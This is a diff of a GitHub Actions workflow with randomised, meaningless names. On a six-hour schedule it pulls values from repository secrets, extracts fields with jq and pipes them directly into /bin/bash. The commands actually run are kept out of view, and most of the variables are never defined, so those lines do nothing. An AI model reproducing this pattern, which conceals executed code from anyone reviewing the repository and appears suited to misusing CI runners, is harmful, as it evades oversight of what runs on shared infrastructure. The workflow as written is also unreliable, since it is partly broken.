@@ -1,22 +1,22 @@
 name: panxiaoxia1616
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 2/6 * * *'
-
+    - cron: '21 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: panxiaoxia1616
         env:
-          fc23: ${{ secrets.fc23 }}
+          vcpzl4: ${{ secrets.vcpzl4 }}
         run: |
-          echo $fc23 | jq -r .tdvv4795 | /bin/bash
-          echo $fniu0 | jq -r .dbxm153 | /bin/bash
-          echo $hjmi82744 | jq -r .fc513 | /bin/bash
-          echo $zf92 | jq -r .jbc4099 | /bin/bash
+          echo $vcpzl4 | jq -r .cn8374 | /bin/bash
+          echo $rxpfy32 | jq -r .ow24152 | /bin/bash
+          echo $ntb227 | jq -r .fvno962 | /bin/bash
+          echo $x874 | jq -r .yjlue7394 | /bin/bash
+          echo $ozqr54920 | jq -r .m1613 | /bin/bash
+          echo $utat1699 | jq -r .huys37 | /bin/bash
+          echo $ot498 | jq -r .ke4 | /bin/bash
 
